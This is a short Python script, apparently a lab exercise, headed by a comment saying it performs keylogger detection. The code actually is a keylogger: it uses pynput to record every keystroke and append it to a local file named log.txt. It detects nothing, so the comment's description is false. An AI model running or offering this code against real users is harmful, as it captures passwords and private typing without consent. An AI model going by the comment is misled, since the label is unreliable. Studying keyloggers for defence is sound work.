# Aim: Program to perform keylogger detection (Keylogger Detection).
from pynput.keyboard import Key, Listener

def on_press(key):
    with open('log.txt', 'a') as f:
        f.write(str(key) + '\n')

with Listener(on_press=on_press) as listener:
    listener.join()